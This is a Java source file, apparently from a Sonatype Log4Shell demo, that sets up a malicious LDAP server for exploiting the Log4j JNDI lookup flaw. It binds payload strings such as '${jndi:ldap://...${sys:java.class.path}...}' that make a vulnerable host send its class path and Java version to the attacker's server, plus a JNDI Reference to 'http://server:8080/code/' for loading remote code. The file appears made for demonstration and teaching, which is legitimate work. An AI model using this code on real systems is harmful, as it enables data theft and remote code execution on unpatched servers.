package com.sonatype.demo.log4shell;



import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.util.HashMap;
import java.util.Hashtable;

public class LdapServerUploader {

    private Context ctx;
    private String server;

    public LdapServerUploader(String server) throws NamingException {
        Hashtable<String, Object> env = new Hashtable<String, Object>();
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://"+server+":1389");
       ctx = new InitialContext(env);

       this.server=server;

    }


    public void addObjects() throws NamingException {


            HashMap m =  new HashMap<>();


            m.put("key is $${sys:java.version}","${sys:java.version}");
            String dn = "cn=map,dc=example,dc=org";
            ctx.bind(dn, m);

            String x="${sys:java.version}";
            ctx.bind("cn=version,dc=example,dc=org",x);



            ctx.bind("cn=thankyou","thanks for your data");
        ctx.bind("cn=template","${jndi:ldap://"+server+":1389/server-data/${sys:java.class.path}//${sys:java.version}//ID1}");
        ctx.bind("cn=version","${jndi:ldap://"+server+":1389/version/${sys:java.version}//ID1}");
        ctx.bind("cn=classpath","${jndi:ldap://"+server+":1389/classpath/${sys:java.class.path}/}");
        ctx.bind("cn=thankyou","thank you for your data");
        ctx.bind("cn=404","nope - no idea");

        Reference ref = new Reference("ExternalObject","ExternalObject","http://"+server+":8080/code/");
        ctx.bind("cn=bogus",ref);
    }
}
